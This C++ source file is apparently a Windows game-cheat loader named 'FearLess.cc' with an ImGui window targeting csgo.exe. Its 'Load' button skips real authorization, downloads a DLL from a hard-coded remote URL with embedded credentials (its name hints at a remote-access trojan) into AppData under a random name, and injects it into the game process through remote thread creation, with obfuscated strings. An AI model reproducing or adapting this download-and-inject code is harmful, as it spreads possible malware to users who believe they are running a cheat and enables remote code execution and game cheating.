#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <vector>
#include "skCrypter.h"
#include "imgui/stringimgui.h"
#include "imgui/imgui.h"
#include "imgui/imgui_impl_dx9.h"
#include "imgui/imgui_impl_win32.h"
#include "imgui/imgui_internal.h"
#include "imgui/imstb_rectpack.h"
#include <fstream>
#include "xorstr.h"
#include <windows.h>
#include <string>
#include <thread>
#include <libloaderapi.h>
#include <cstdio>
#include <processthreadsapi.h>
#include <iostream>
#include <fstream>
#include <fstream>
#include <d3d9.h>
#include <ctime>
#include <conio.h>
#include <cstdint>
#include <TlHelp32.h>
#include <windows.h>
#include <libloaderapi.h>
#include <cstdio>
#include <string>
#include <thread>
#include <processthreadsapi.h>
#include <Psapi.h>
#include "stdio.h"
#include<stdio.h>
#include <d3d9.h>
#pragma comment(lib, "d3d9.lib")
#define DIRECTINPUT_VERSION 0x0800
#define LOADERW 314
#define LOADERH 268
#include <dinput.h>
#include <tchar.h>
#include <dwmapi.h>
#pragma comment(lib, "dwmapi.lib")
#include <WinInet.h> 
#pragma comment(lib, "dwmapi.lib")

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")

static char buf[17] = { 0 };
static std::string key;
static bool testCheckbox = false;

static HANDLE GetProcessByName(const wchar_t* name)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    size_t len = wcslen(name);
    Process32First(snapshot, &entry);
    do
    {
        if (_wcsnicmp(name, entry.szExeFile, len) == 0)
        {
            return OpenProcess(PROCESS_ALL_ACCESS, false, entry.th32ProcessID);
        }
    } while (Process32Next(snapshot, &entry));
    return 0;
}

typedef NTSTATUS(__stdcall* f_NtCreateThreadEx)(HANDLE* pHandle, ACCESS_MASK DesiredAccess, void* pAttr, HANDLE hProc, void* pFunc, void* pArg,
    ULONG Flags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, void* pAttrListOut);

HANDLE StartRoutine(HANDLE hTargetProc, void* pRoutine, void* pArg)
{
    auto _NtCTE = reinterpret_cast<f_NtCreateThreadEx>(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"));
    if (!_NtCTE)
        return CreateRemoteThreadEx(hTargetProc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pRoutine), pArg, 0, nullptr, nullptr);

    HANDLE hRet = nullptr;
    _NtCTE(&hRet, THREAD_ALL_ACCESS, nullptr, hTargetProc, pRoutine, pArg, 0, 0, 0, 0, nullptr);
    return hRet;
}

int Inject(const char* szDllFile, HANDLE hProc)
{
    if (!hProc)
        return 1;

    std::ifstream dll(szDllFile);
    if (!dll.is_open())
        return 1;

    auto Len = lstrlenA(szDllFile);

    void* pArg = VirtualAllocEx(hProc, nullptr, Len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pArg)
        return 1;

    if (!WriteProcessMemory(hProc, pArg, szDllFile, Len, nullptr))
    {
        VirtualFreeEx(hProc, pArg, 0, MEM_RELEASE);
        return 1;
    }

    DWORD dwExitCode = 0;
    HANDLE hThread = StartRoutine(hProc, LoadLibraryA, pArg);
    if (!hThread)
    {
        VirtualFreeEx(hProc, pArg, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    GetExitCodeThread(hThread, &dwExitCode);
    CloseHandle(hThread);

    VirtualFreeEx(hProc, pArg, 0, MEM_RELEASE);

    if (!dwExitCode)
        return 1;

    return 0;
}

bool Authorization() {
    int auth = 1;
// nothingm pls do here da login
    return auth;
}

static LPDIRECT3D9              g_pD3D = NULL;
static LPDIRECT3DDEVICE9        g_pd3dDevice = NULL;
static D3DPRESENT_PARAMETERS    g_d3dpp = {};

bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void ResetDevice();
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);



int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
{
    
    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("FearLess.cc"), NULL };
    ::RegisterClassEx(&wc);
    int x = GetSystemMetrics(SM_CXSCREEN) / 2 - LOADERW / 2; // cetner screen x
    int y = GetSystemMetrics(SM_CYSCREEN) / 2 - LOADERH / 2; // center screen y
    HWND hwnd = ::CreateWindowExW(WS_EX_LAYERED, wc.lpszClassName, _T("FearLess.cc"), WS_POPUP, x, y, LOADERW, LOADERH, NULL, NULL, wc.hInstance, NULL);

    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

    if (!CreateDeviceD3D(hwnd))
    {
        CleanupDeviceD3D();
        ::UnregisterClass(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO();
    io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Tahoma.ttf", 16);
    
    ImGui::GetStyle().WindowRounding = 0.0f;
    ImGui::GetStyle().WindowPadding = ImVec2(0.0f, 0.0f);
    ImGui::GetStyle().ChildRounding = 0.0f;
    ImGui::GetStyle().WindowBorderSize = 0.0f;
    ImGui::GetStyle().WindowTitleAlign = ImVec2(0.5, 0.5);
    ImGui::GetStyle().PopupBorderSize = 0.0f;

    ImVec4* colors = ImGui::GetStyle().Colors;
    colors[ImGuiCol_WindowBg] = ImColor(33, 33, 33, 215);//zochem? ia zhe ubral bg?
    colors[ImGuiCol_ChildBg] = ImColor(21, 20, 21, 255);
    colors[ImGuiCol_ResizeGrip] = ImColor(42, 40, 43, 0);
    colors[ImGuiCol_ResizeGripHovered] = ImColor(42, 40, 43, 0);
    colors[ImGuiCol_ResizeGripActive] = ImColor(42, 40, 43, 0);
    colors[ImGuiCol_Border] = ImColor(38, 39, 55, 215);
    colors[ImGuiCol_Button] = ImColor(29, 125, 229, 5);
    colors[ImGuiCol_ButtonHovered] = ImColor(29, 125, 229, 5);
    colors[ImGuiCol_ButtonActive] = ImColor(29, 125, 229, 5);
    colors[ImGuiCol_PopupBg] = ImColor(18, 17, 18, 255);

    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX9_Init(g_pd3dDevice);

    static bool opened = true;

    MSG msg;
    ZeroMemory(&msg, sizeof(msg));
    while (msg.message != WM_QUIT)
    {

        if (::PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            continue;
        }

        ImGui_ImplDX9_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        {
            ImGui::SetNextWindowPos(ImVec2(0, 0));
            ImGui::SetNextWindowSize(ImVec2(LOADERW, LOADERH));
            ImGui::Begin(xorstr("FearLess.cc"), &opened, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBackground); // Create a window called "Hello, world!" and append into it.
            
            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(50,50,60));
            ImGui::GetWindowDrawList()->AddRect(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(188, 188, 188, 50));
            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(7, 9), ImVec2(307, 259), ImColor(31, 31, 31));
         //   ImGui::GetWindowDrawList()->AddRect(ImVec2(7, 9), ImVec2(307, 259), ImColor(188, 188, 188, 50));
            ImGui::GetWindowDrawList()->AddRectFilledMultiColor(ImVec2(21, 38), ImVec2(294, 43), ImColor(78, 129, 181), ImColor(94, 175, 255), ImColor(64, 159, 255), ImColor( 64, 159, 255));
          //  ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(21, 54), ImVec2(294, 237), ImColor(22, 22, 22));
          //  ImGui::GetWindowDrawList()->AddRect(ImVec2(21, 54), ImVec2(294, 237), ImColor(188, 188, 188, 50));

            ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
            ImGui::Text(xorstr("FearLess.cc"));
            ImGui::SetCursorPos(ImVec2(66, 81));
            ImGui::Text(xorstr("Invite"));
            ImGui::PushItemWidth(177);
            ImGui::SetCursorPos(ImVec2(64, 100));
            ImGui::InputText(xorstr("###Key"), buf, IM_ARRAYSIZE(buf));
            ImGui::PopItemWidth();
            ImGui::SetCursorPos(ImVec2(64, 135));
            if (ImGui::Button(xorstr("Register"), ImVec2(177, 21))) {

            }
            ImGui::SetCursorPos(ImVec2(64, 155));
            if (ImGui::Button(xorstr("Load"), ImVec2(177, 21))) {
                key = buf;
                if (Authorization()) {
                    const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
                    HINTERNET hInternet = InternetOpen(skCrypt(L"��� ���� ��������"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
                    if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
                    LPCWSTR query = skCrypt(L"https://google.com/");

                    HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
                    std::string EndFile = getenv(skCrypt("APPDATA"));
                    EndFile += xorstr("\\");
                    for (int i = 0; i < 12; i++)
                    {
                        EndFile += alphabet[abs(int(rand()) % 36)];
                    }
                    EndFile += xorstr(".dll");
                    DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
                    if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // ��������� dll
                    HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
                    if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }

                    if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
                    InternetCloseHandle(hInternet);
                    InternetCloseHandle(hUrl);
                    MessageBox(0, L"Cheat Injected!", L"Success", MB_OK);
                }
            }
            ImGui::End();
        }
        ImGui::EndFrame();
        g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
        g_pd3dDevice->Clear(0, NULL, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, NULL, 1.0f, 0);
        if (g_pd3dDevice->BeginScene() >= 0)
        {
            ImGui::Render();
            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
            g_pd3dDevice->EndScene();
        }
        HRESULT result = g_pd3dDevice->Present(NULL, NULL, NULL, NULL);

        if (result == D3DERR_DEVICELOST && g_pd3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
            ResetDevice();

        if (!opened) msg.message = WM_QUIT;
    }

    ImGui_ImplDX9_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClass(wc.lpszClassName, wc.hInstance);

    return 0;
}

bool CreateDeviceD3D(HWND hWnd)
{
    if ((g_pD3D = Direct3DCreate9(D3D_SDK_VERSION)) == NULL)
        return false;

    // Create the D3DDevice
    ZeroMemory(&g_d3dpp, sizeof(g_d3dpp));
    g_d3dpp.Windowed = TRUE;
    g_d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
    g_d3dpp.BackBufferFormat = D3DFMT_UNKNOWN;
    g_d3dpp.EnableAutoDepthStencil = TRUE;
    g_d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
    g_d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_ONE;           // Present with vsync
    g_d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE;   // Present without vsync, maximum unthrottled framerate
    if (g_pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &g_d3dpp, &g_pd3dDevice) < 0)
        return false;

    return true;
}

void CleanupDeviceD3D()
{
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = NULL; }
    if (g_pD3D) { g_pD3D->Release(); g_pD3D = NULL; }
}

void ResetDevice()
{
    ImGui_ImplDX9_InvalidateDeviceObjects();
    HRESULT hr = g_pd3dDevice->Reset(&g_d3dpp);
    if (hr == D3DERR_INVALIDCALL)
        IM_ASSERT(0);
    ImGui_ImplDX9_CreateDeviceObjects();
}

POINTS m_Pos; // store user click pos

// Win32 message handler
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_LBUTTONDOWN:
    {
        m_Pos = MAKEPOINTS(lParam); // set click points
        return 0;
    }
    case WM_MOUSEMOVE:
    {
        if (wParam == MK_LBUTTON)
        {
            POINTS p = MAKEPOINTS(lParam); // get cur mousemove click points
            RECT rect;
            GetWindowRect(hWnd, &rect);
            rect.left += p.x - m_Pos.x; // get xDelta
            rect.top += p.y - m_Pos.y;  // get yDelta
            if (m_Pos.x >= 0 && m_Pos.x <= LOADERW - 20 /* cuz 20px - close btn */ && m_Pos.y >= 0 && m_Pos.y <= ImGui::GetFontSize() + ImGui::GetStyle().FramePadding.y * 2.0f)
                SetWindowPos(hWnd, HWND_TOPMOST, rect.left, rect.top, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOZORDER);
        }
        return 0;
    }
    case WM_SIZE:
        if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
        {
            g_d3dpp.BackBufferWidth = LOWORD(lParam);
            g_d3dpp.BackBufferHeight = HIWORD(lParam);
            ResetDevice();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
            return 0;
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProc(hWnd, msg, wParam, lParam);
}